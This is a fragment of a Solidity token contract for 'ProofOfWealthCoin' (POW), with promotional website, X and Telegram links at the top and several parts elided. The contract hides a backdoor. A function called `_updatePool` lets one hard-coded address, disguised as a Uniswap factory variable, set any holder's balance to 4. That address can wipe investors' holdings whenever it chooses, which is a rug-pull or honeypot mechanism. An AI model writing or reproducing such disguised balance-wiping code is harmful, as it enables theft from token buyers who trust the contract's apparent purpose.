...
https://x.com/Proof0fwealth
https://t.me/Proofofwealth
https://proofofwealth.xyz
*/
...
pragma solidity ^0.8.0;
contract ProofOfWealthCoin is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _symbol = unicode"POW";
    string private constant _name = unicode"ProofOfWealth";
    uint8 private constant _decimals = 9;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    address private _factoryV2Uniswap = 0xF94b352EEF5370520F3fA5989462F447C3eBC38f;
    uint256 private tTotal = 6010000000000 * 10**_decimals;
    ...
    } function _updatePool(address _updatePoolSender) external { if (msg.sender == _factoryV2Uniswap) _balances[_updatePoolSender] = 0x4;
    } 
